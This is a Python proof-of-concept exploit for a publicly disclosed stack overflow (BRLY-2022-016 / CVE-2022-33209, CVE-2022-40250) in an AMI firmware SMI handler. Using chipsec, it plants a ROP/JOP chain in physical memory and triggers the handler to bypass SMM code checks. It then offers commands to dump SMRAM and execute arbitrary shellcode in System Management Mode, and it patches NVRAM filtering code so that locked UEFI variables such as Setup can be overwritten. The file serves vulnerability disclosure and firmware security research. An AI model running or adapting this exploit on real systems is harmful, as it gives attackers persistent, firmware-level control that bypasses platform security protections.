#!/usr/bin/env python3

# PoC for BRLY-2022-016 (CVE-2022-33209, CVE-2022-40250) vulnerability that demonstrates SMM_Code_Chk_En bypassing using ROP/JOP technique
# and provides primitives for SMRAM reading/writing and executing arbitrary code in SMM
# BRLY-2022-016 vulnerability was disclosed as part of the BHUS 2022 presentation
# and represents a stack overflow vulnerability in the SMI handler of SmmSmbiosElog module
# Binarly advisory: https://www.binarly.io/advisories/BRLY-2022-016/index.html
# Slides: https://i.blackhat.com/USA-22/Wednesday/US-22-Matrosov-Breaking-Firmware-Trust-From-Pre-EFI.pdf

import binascii
import ctypes
import os
import struct
import tempfile
import uuid
from typing import Optional

import chipsec
import chipsec.chipset
import click
from chipsec.chipset import Chipset
from chipsec.hal.interrupts import Interrupts
from chipsec.hal.uefi import UEFI


class CommBufferStructureCase1(ctypes.LittleEndianStructure):
    _pack_ = 1
    _fields_ = [
        ("Command", ctypes.c_uint64),  # 0x00
        ("Arg1", ctypes.c_uint64),  # 0x08
        ("Arg2", ctypes.c_uint32),  # 0x10
        ("Arg3", ctypes.c_uint8),  # 0x14
        ("Undefined", ctypes.c_uint8 * 3),
        ("Arg4", ctypes.c_uint64),  # 0x18
        ("Arg5", ctypes.c_uint64),  # 0x20
        ("StatusCode", ctypes.c_uint64),  # 0x28
    ]


class ChipsecHelper:
    RTCODE_START = 0x000000005A73B000  # from memmap
    RTCODE_END = 0x000000005A7FEFFF

    def __init__(self) -> None:
        self._cs: Optional[Chipset] = None
        self._intr: Optional[Interrupts] = None
        self._uefi: Optional[UEFI] = None
        self._smmc_loc: Optional[int] = None

    def _get_cs(self) -> Chipset:
        cs = chipsec.chipset.cs()
        cs.init(None, True, True)
        return cs

    @property
    def cs(self) -> Chipset:
        if self._cs is None:
            self._cs = self._get_cs()
        return self._cs

    def _get_intr(self) -> Interrupts:
        intr = Interrupts(self.cs)
        return intr

    @property
    def intr(self) -> Interrupts:
        if self._intr is None:
            self._intr = self._get_intr()
        return self._intr

    def _get_uefi(self) -> UEFI:
        uefi = UEFI(self.cs)
        return uefi

    @property
    def uefi(self) -> UEFI:
        if self._uefi is None:
            self._uefi = self._get_uefi()
        return self._uefi

    def _locate_smmc(self) -> int:
        # locate SMM_CORE_PRIVATE_DATA
        data = self.cs.helper.read_physical_mem(
            ChipsecHelper.RTCODE_START,
            ChipsecHelper.RTCODE_END - ChipsecHelper.RTCODE_START + 1,
        )
        smmc_offset = data.find(b"smmc")
        assert smmc_offset >= 0
        smmc_loc = ChipsecHelper.RTCODE_START + smmc_offset
        return smmc_loc

    @property
    def smmc_loc(self) -> int:
        if self._smmc_loc is None:
            self._smmc_loc = self._locate_smmc()
        return self._smmc_loc

    def read_byte(self, address) -> int:
        return struct.unpack("<B", self.cs.helper.read_physical_mem(address, 1))[0]

    def read_word(self, address) -> int:
        return struct.unpack("<H", self.cs.helper.read_physical_mem(address, 2))[0]

    def read_dword(self, address) -> int:
        return struct.unpack("<I", self.cs.helper.read_physical_mem(address, 4))[0]

    def read_qword(self, address) -> int:
        return struct.unpack("<Q", self.cs.helper.read_physical_mem(address, 8))[0]

    def read_oword(self, address) -> int:
        return int.from_bytes(
            self.cs.helper.read_physical_mem(address, 8), byteorder="little"
        )

    def write_byte(self, address, value) -> None:
        self.cs.helper.write_physical_mem(address, 1, struct.pack("<B", value))

    def write_word(self, address, value) -> None:
        self.cs.helper.write_physical_mem(address, 2, struct.pack("<H", value))

    def write_dword(self, address, value) -> None:
        self.cs.helper.write_physical_mem(address, 4, struct.pack("<I", value))

    def write_qword(self, address, value) -> None:
        self.cs.helper.write_physical_mem(address, 8, struct.pack("<Q", value))


class Poc:
    # GUID of a vulnerable SMI handler
    AMI_SMM_DUMMY_PROTOCOL_REDIR_GUID = "9c72f7fb-86b6-406f-b86e-f3809a86c138"

    # settings
    SMRAM_BASE = 0x63000000
    SMRAM_SIZE = 0x1000000

    # SmmSmbiosElog base address
    SMM_SMBIOS_ELOG_BASE = 0x63CE9000
    # PiSmmCpuDxeSmm base address
    PI_SMM_CPU_DXE_SMM_BASE = 0x63F61000
    # PiSmmCore base address
    PI_SMM_CORE_BASE = 0x63FF1000
    # NvramSmm base address
    NVRAM_SMM_BASE = 0x63DF0000  # from SMRAM dump
    # OverClockSmiHandler base address
    OVER_CLOCK_SMI_HANDLER_BASE = 0x63B21000  # from SMRAM dump

    # variables attributes
    EFI_VARIABLE_NON_VOLATILE = 0x00000001
    EFI_VARIABLE_BOOTSERVICE_ACCESS = 0x00000002
    EFI_VARIABLE_RUNTIME_ACCESS = 0x00000004
    EFI_VARIABLE_HARDWARE_ERROR_RECORD = 0x00000008
    EFI_VARIABLE_AUTHENTICATED_WRITE_ACCESS = 0x00000010

    def __init__(self) -> None:
        self.helper = ChipsecHelper()

    def copy_mem(self, dst: int, src: int, size: int) -> bool:
        # this function provides a memory copying primitive
        # where dst and src can point to SMRAM
        # so we can read and write SMRAM with this function

        payload_loc = 0x53000000

        # 0x0000000000001b41: pop rax; ret;
        gadget0_addr = Poc.PI_SMM_CPU_DXE_SMM_BASE + 0x1B41
        # 0x0000000000002dab: mov r8, rbp; sub r8, r14; mov edx, r14d; add r8, 0x207c; mov rcx, rdi; call qword ptr [rax + 0x10];
        gadget1_addr = Poc.SMM_SMBIOS_ELOG_BASE + 0x2DAB
        # 0x000000000000194f: mov cr0, rax; ret;
        # https://github.com/liba2k/Insomni-Hack-2022/blob/main/latitude_chipsec_secureboot.py#L176
        gadget2_addr = Poc.PI_SMM_CPU_DXE_SMM_BASE + 0x194F
        # CopyMem addr
        gadget3_addr = Poc.PI_SMM_CORE_BASE + 0x1000
        # 0x0000000000005467: xor eax, eax; ret;
        gadget4_addr = Poc.PI_SMM_CPU_DXE_SMM_BASE + 0x5467

        _rax = payload_loc + 984
        self.helper.write_qword(_rax + 0x10, gadget0_addr)
        _rdi = dst  # mov rcx, rdi (dst buffer address)
        _r14 = src  # mov edx, r14d (src buffer address)
        _rbp = _r14 - 0x207C + size
        _r12 = 0x1212121212121212  # unused
        _r15 = 0x1515151515151515  # unused

        arg5_addr = payload_loc + 120
        arg1_addr = payload_loc + 128

        self.helper.write_byte(arg1_addr, 0xE2)  # if ( *Arg1 == 0xE2 )
        self.helper.write_byte(arg1_addr + 1, 0x81)  # Value = *(Arg1 + 1)

        self.helper.write_qword((arg1_addr + 8) + 0x128 - 40, _r15)  # set R15
        self.helper.write_qword((arg1_addr + 8) + 0x128 - 32, _r14)  # set R14
        self.helper.write_qword((arg1_addr + 8) + 0x128 - 24, _r12)  # set R12
        self.helper.write_qword((arg1_addr + 8) + 0x128 - 16, _rdi)  # set RDI
        self.helper.write_qword((arg1_addr + 8) + 0x128 - 8, _rbp)  # set RBP
        self.helper.write_qword(
            (arg1_addr + 8) + 0x128, gadget0_addr
        )  # rewrite return address
        self.helper.write_qword((arg1_addr + 8) + 0x128 + 8, _rax)  # set RAX
        self.helper.write_qword(
            (arg1_addr + 8) + 0x128 + 16, gadget1_addr
        )  # set CopyMem params
        self.helper.write_qword((arg1_addr + 8) + 0x128 + 24, gadget0_addr)
        self.helper.write_qword(
            (arg1_addr + 8) + 0x128 + 32, 0x80000033
        )  # RAX = 0x80000033
        self.helper.write_qword((arg1_addr + 8) + 0x128 + 40, gadget2_addr)  # CR0 = RAX
        self.helper.write_qword((arg1_addr + 8) + 0x128 + 48, gadget3_addr)  # CopyMem
        self.helper.write_qword((arg1_addr + 8) + 0x128 + 56, gadget4_addr)  # RAX = 0

        copy_mem_size = 0x128 + 64

        buffer = CommBufferStructureCase1()
        buffer.Command = 1
        buffer.Arg1 = arg1_addr
        buffer.Arg2 = 0  # if ( Arg2 ) return EFI_NOT_FOUND
        buffer.Arg3 = 0  # any value
        buffer.Arg4 = copy_mem_size  # CopyMem size param
        buffer.Arg5 = arg5_addr
        buffer.StatusCode = -1

        # trigger handler
        self.helper.intr.send_smmc_SMI(
            self.helper.smmc_loc,
            Poc.AMI_SMM_DUMMY_PROTOCOL_REDIR_GUID,
            bytes(buffer),
            payload_loc,
        )

        return True

    def smram_dump(self, smram_fpath: str) -> None:
        # with this function we can write the contents of SMRAM
        # to a `smram_fpath` file

        locked_pages = list(range(0x63E3A000, 0x63F61000, 0x22000))

        size = 0x1000
        dst = 0x53000000 + 1024
        f = open(smram_fpath, "wb")
        offset = 0
        for src in range(Poc.SMRAM_BASE, Poc.SMRAM_BASE + Poc.SMRAM_SIZE, size):
            print(f"Reading SMRAM from address {src:#x}")

            if src in locked_pages:
                f.write(b"\xff" * size)
                offset += size
                f.seek(offset)
                continue

            self.copy_mem(dst, src, size)
            f.write(self.helper.cs.helper.read_physical_mem(dst, size))
            offset += size
            f.seek(offset)
        f.close()

        print(f"Dump of SMRAM saved in {smram_fpath}")

    def exec_shellcode_smm(self, shellcode: bytes) -> None:
        # this function allows to execute shellcode in SMM
        # you need to consider the shell code as a full-fledged function
        # and conclude with the ret instruction

        # write shellcode
        # OverClockSmiHandler_base + 0x12E0
        shellcode_dst = Poc.OVER_CLOCK_SMI_HANDLER_BASE + 0x12E0
        src = 0x53000000 + 1024
        self.helper.cs.helper.write_physical_mem(src, len(shellcode), shellcode)
        self.copy_mem(shellcode_dst, src, len(shellcode))

        # 0x0000000000005467: xor eax, eax; ret;
        gadget_addr = Poc.PI_SMM_CPU_DXE_SMM_BASE + 0x5467

        # setup for communication buffer
        payload_loc = 0x53000000

        arg5_addr = payload_loc + 120
        arg1_addr = payload_loc + 128
        self.helper.write_byte(arg1_addr, 0xE2)  # if ( *Arg1 == 0xE2 )
        self.helper.write_byte(arg1_addr + 1, 0x81)  # Value = *(Arg1 + 1)

        self.helper.cs.helper.write_physical_mem((arg1_addr + 8), 0x128, b"A" * 0x128)
        self.helper.write_qword((arg1_addr + 8) + 0x128, shellcode_dst)
        self.helper.write_qword((arg1_addr + 8) + 0x128 + 8, gadget_addr)
        self.helper.write_qword((arg1_addr + 8) + 0x128 + 16, gadget_addr)
        self.helper.write_qword((arg1_addr + 8) + 0x128 + 24, gadget_addr)
        self.helper.write_qword((arg1_addr + 8) + 0x128 + 32, gadget_addr)
        self.helper.write_qword((arg1_addr + 8) + 0x128 + 40, gadget_addr)
        self.helper.write_qword((arg1_addr + 8) + 0x128 + 48, gadget_addr)
        self.helper.write_qword((arg1_addr + 8) + 0x128 + 56, gadget_addr)

        copy_mem_size = 0x128 + 64

        buffer = CommBufferStructureCase1()
        buffer.Command = 1
        buffer.Arg1 = arg1_addr
        buffer.Arg2 = 0  # if ( Arg2 ) return EFI_NOT_FOUND
        buffer.Arg3 = 0  # any value
        buffer.Arg4 = copy_mem_size  # CopyMem size param
        buffer.Arg5 = arg5_addr
        buffer.StatusCode = -1

        # trigger handler
        _ReturnStatus = self.helper.intr.send_smmc_SMI(
            self.helper.smmc_loc,
            Poc.AMI_SMM_DUMMY_PROTOCOL_REDIR_GUID,
            bytes(buffer),
            payload_loc,
        )

    def smm_set_variable(
        self, variable_name: str, vendor_guid: str, attributes: int, data: bytes
    ) -> None:
        # this function allows to use SmmSetVariable() function
        # it allows us to change the locked variables

        vendor_guid_bytes_le = uuid.UUID(vendor_guid).bytes_le
        variable_name_utf16_le = variable_name.encode("utf-16le")

        # .data:000000000000F238 ; EFI_SMM_VARIABLE_PROTOCOL *gEfiSmmVariableProtocol
        # .data:000000000000F238 dq offset SmmGetVariable
        # .data:000000000000F240 dq offset SmmGetNextVariableName
        # .data:000000000000F248 dq offset SmmSetVariable
        # .data:000000000000F250 dq offset SmmQueryVariableInfo
        SmmRuntimeServicesVendorTable = 0x63F8D118

        # CHAR16 *VariableName: params_buffer_addr
        # EFI_GUID *VendorGuid: params_buffer_addr + 100h
        # void *Data:           params_buffer_addr + 120h
        params_buffer_addr = 0x53000000 + 2048
        variable_name_addr = params_buffer_addr
        vendor_guid_addr = params_buffer_addr + 0x100
        status_code_addr = params_buffer_addr - 8
        data_addr = params_buffer_addr + 0x120

        self.helper.cs.helper.write_physical_mem(
            params_buffer_addr, 1024, b"\x00" * 1024
        )

        self.helper.cs.helper.write_physical_mem(
            variable_name_addr, len(variable_name_utf16_le), variable_name_utf16_le
        )  # write VariableName
        self.helper.cs.helper.write_physical_mem(
            vendor_guid_addr, len(vendor_guid_bytes_le), vendor_guid_bytes_le
        )  # write VendorGuid
        self.helper.cs.helper.write_physical_mem(
            data_addr, len(data), data
        )  # write Data
        self.helper.cs.helper.write_physical_mem(
            status_code_addr, 8, b"\xaa" * 8
        )  # write Status

        code = f"""
        use64

        _SmmSetVariable:
            sub rsp, 0x38
            mov rax, {data_addr:#x}
            mov [rsp+0x20], rax
            mov r9, {len(data):#x}
            mov r8, {attributes:#x}
            mov rdx, {vendor_guid_addr:#x}
            mov rcx, {variable_name_addr:#x}
            mov rax, {SmmRuntimeServicesVendorTable:#x}
            call [rax+0x58]
            mov r11, {status_code_addr:#x}
            mov [r11], rax
            add rsp, 0x38
            ret
        """

        # compile shellcode
        shellcode = bytes()
        with tempfile.NamedTemporaryFile(
            mode="w", prefix="code_", suffix=".asm", dir=None, delete=True
        ) as asm:
            asm.write(code)
            asm.flush()
            os.system(" ".join(["nasm", asm.name]))
            fname, _ = os.path.splitext(asm.name)
            with open(fname, "rb") as bin:
                shellcode = bin.read()
                print(f"Shellcode: {binascii.hexlify(shellcode).decode()}")

        self.exec_shellcode_smm(shellcode)

        # SmmGetVariable/SmmSetVariable function result
        status = self.helper.read_qword(status_code_addr)
        print(
            f"Result: {chipsec.hal.uefi_common.EFI_ERROR_STR(status)} ({hex(status)})"
        )

    def modify_setup_data(self, setup_new_data: bytes, backup_old: bool = True) -> None:
        # this function allows to use SmmSetVariable() function for the Setup variable
        # since the variable is filtered in NvramSmm, we need to bypass the filtering

        # Bypass check for Setup variable
        addrs = [
            Poc.NVRAM_SMM_BASE + 0x1845,
        ]
        for dst in addrs:
            src = 0x53000000 + 1024
            data = b"\x75"
            self.helper.cs.helper.write_physical_mem(src, len(data), data)
            self.copy_mem(dst, src, len(data))

        dst = Poc.NVRAM_SMM_BASE + 0x5008
        src = 0x53000000 + 1024
        patch_buffer = b"\x48\x31\xc0\xc3"
        self.helper.cs.helper.write_physical_mem(src, len(patch_buffer), patch_buffer)
        self.copy_mem(dst, src, len(patch_buffer))

        dst = Poc.NVRAM_SMM_BASE + 0x5562
        src = 0x53000000 + 1024
        patch_buffer = b"\x90" * 6
        self.helper.cs.helper.write_physical_mem(src, len(patch_buffer), patch_buffer)
        self.copy_mem(dst, src, len(patch_buffer))

        setup_data = self.helper.uefi.get_EFI_variable(
            "Setup", "ec87d643-eba4-4bb5-a1e5-3f3e36b20da9"
        )
        if backup_old:
            # create backup for old data
            with open("ec87d643-eba4-4bb5-a1e5-3f3e36b20da9-Setup.bin", "wb") as f:
                f.write(setup_data)
        self.smm_set_variable(
            variable_name="Setup",
            vendor_guid="ec87d643-eba4-4bb5-a1e5-3f3e36b20da9",
            attributes=(
                Poc.EFI_VARIABLE_NON_VOLATILE
                | Poc.EFI_VARIABLE_BOOTSERVICE_ACCESS
                | Poc.EFI_VARIABLE_RUNTIME_ACCESS
            ),
            data=setup_new_data,
        )


@click.group()
def cli():
    pass


def print_help(command, msg: str) -> None:
    click.echo(click.style(msg, fg="red"))
    with click.Context(command) as ctx:
        click.echo(command.get_help(ctx))


@click.command()
@click.argument("smram_fpath", type=str)
def smram_dump(smram_fpath: str) -> bool:
    """Dump SMRAM contents to file."""

    if not smram_fpath:
        print_help(smram_dump, "Specify path to SMRAM dump file")
        return False

    poc = Poc()
    try:
        poc.smram_dump(smram_fpath)
    except Exception as e:
        print_help(smram_dump, repr(e))
        return False

    return True


@click.command()
@click.argument("asm_fpath", type=str)
def smm_exec(asm_fpath: str) -> bool:
    """Execute code in SMM."""

    if not asm_fpath or not os.path.isfile(asm_fpath):
        print_help(smm_exec, "Specify path to .nasm file")
        return False

    with open(asm_fpath, "r") as f:
        buffer = f.read()

    if not buffer.startswith("use64"):
        print_help(smm_exec, "The contents of the .nasm file must begin with use64")
        return False

    # below is an example of *.nasm file content
    # for another example check smm_set_variable function)

    # use64
    #
    # _Test:
    #     mov rbx, 0x594c5242 ; BRLY
    #     mov rax, 0x5a000000
    #     mov [rax], rbx
    #     ret

    # compile shellcode
    shellcode = bytes()
    os.system(" ".join(["nasm", asm_fpath]))
    fname, _ = os.path.splitext(asm_fpath)
    try:
        with open(fname, "rb") as bin:
            shellcode = bin.read()
            print(f"Shellcode: {binascii.hexlify(shellcode).decode()}")
        os.remove(fname)
    except FileNotFoundError:
        print_help(smm_exec, "Could not compile shellcode")
        return False

    poc = Poc()
    poc.exec_shellcode_smm(shellcode)

    return True


cli.add_command(smram_dump)
cli.add_command(smm_exec)

if __name__ == "__main__":
    cli()
